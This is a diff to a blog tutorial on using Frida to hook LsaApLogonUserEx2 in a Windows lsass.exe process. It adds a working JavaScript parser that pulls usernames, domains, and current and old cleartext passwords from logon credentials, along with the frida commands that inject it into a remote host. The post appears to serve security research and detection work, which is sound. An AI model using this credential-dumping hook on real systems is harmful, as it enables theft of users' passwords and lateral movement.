@@ -52,7 +52,7 @@ So, now we have a good idea of a target, but how do we know which functions to h
 frida-trace -H 192.168.1.120 lsass.exe -i 'msv1_0.DLL!*'
 ```
 
-We leave this running while we invoke an interactive logon somewhere on the target VM (i.e. using the *runas* commad), and sure enough:
+We leave this running while we invoke an interactive logon somewhere on the target VM (i.e. using the *runas* command), and sure enough:
 
 ![a screenshot of various hooked functions including LsaApLogonUserEx2](/img/tracing-msv1_0.png)
 
@@ -97,7 +97,7 @@ Interceptor.attach(logonUser, {
 });
 ```
 
-So far, the script it pretty simple. We identify the address of the function and attach to it with Frida's interceptor. When the function is entered, we save the address of the PrimaryCredentials array. When the function exits, we print the address. To test it out, simply inject the script into Frida:
+So far, the script is pretty simple. We identify the address of the function and attach to it with Frida's interceptor. When the function is entered, we save the address of the PrimaryCredentials array. When the function exits, we print the address. To test it out, simply inject the script into Frida:
 
 ```bash
 $ frida -H 192.168.1.120 lsass.exe -l LsaApLogonUserEx2.js
@@ -128,8 +128,63 @@ typedef struct _SECPKG_PRIMARY_CRED {
 } SECPKG_PRIMARY_CRED, *PSECPKG_PRIMARY_CRED;
 ```
 
-This gives us all the information we need to write our own parser in Frida.
+This gives us all the information we need to write our own parser in Frida. We can "walk" through the struct by starting from our pointer and adding the size of each struct member to get to the next one. For example, the size of a *LUID* struct is 0x8, so we can do:
 
+```javascript
+var logonId = this.primaryCredentials;
+var downLevelName = logonId.add(0x8);
+```
+
+By iterating through in this way, we can eventually get pointers to the members we actually care about: *DownLevelName*, *DomainName*, *Password* and *OldPassword*. Each of these elements is a *UNICODE_STRING* struct, which requires a bit of parsing themselves. The final parsing function is as follows:
+
+```javascript
+function parsePrimaryCredentials(ptr) {
+	// Parse the SECPKG_PRIMARY_CRED structure pass to LsaApLogonUserEx2. 64-bit only.
+	// Input: a pointer to the SECPKG_PRIMARY_CRED structure to be parsed.
+	
+	var size_luid = 0x8; // https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/igpupvdev/ns-igpupvdev-_luid
+	var size_unicode_string = 0x10; // https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/shared/ntdef/unicode_string.htm
+	
+	// Reference for struct members:
+	// https://docs.microsoft.com/en-us/windows/win32/api/ntsecpkg/ns-ntsecpkg-secpkg_primary_cred
+
+	// Calculate the address of each member by adding the sizeof the previous member.
+	var logonId = ptr;
+	var downLevelName = logonId.add ( size_luid );
+	var domainName = downLevelName.add( size_unicode_string );
+	var password = domainName.add( size_unicode_string );
+	var oldPassword = password.add( size_unicode_string );
+
+	// Read the length from each unicode string. Divide by 2 because we are reading UTF 16 strings.
+	// Length is located at offset 0x0 in the UNICODE_STRING struct.
+	var downLevelNameLength = downLevelName.readUShort() / 2;
+	var domainNameLength = domainName.readUShort() / 2;
+	var passwordLength = password.readUShort() / 2;
+	var oldPasswordLength = oldPassword.readUShort() / 2;
+
+	// Use the length values to read the correct number of bytes from each unicode string.
+	// Buffer is located at offset 0x8 in the UNICODE_STRING struct.
+	var downLevelNameBuffer = downLevelName.add(0x8).readPointer().readUtf16String(downLevelNameLength);
+	var domainNameBuffer = domainName.add(0x8).readPointer().readUtf16String(domainNameLength);
+	var passwordBuffer = password.add(0x8).readPointer().readUtf16String(passwordLength);
+	var oldPasswordBuffer = oldPassword.add(0x8).readPointer().readUtf16String(oldPasswordLength);
+
+	//Return results.
+	var output = {
+		"sam_account": downLevelNameBuffer,
+		"domain": domainNameBuffer,
+		"password": passwordBuffer,
+		"old_password": oldPasswordBuffer
+	}
+	return output;
+}
+```
+
+And the final result when running it against my Windows 10 VM and initiating an interactive logon:
+
+![a screenshot of dumped credentials from a user logon](/img/dumping-msv1_0.png)
+
+## Conclusion
 
 <!--
 Resources that helped me, which I should credit:
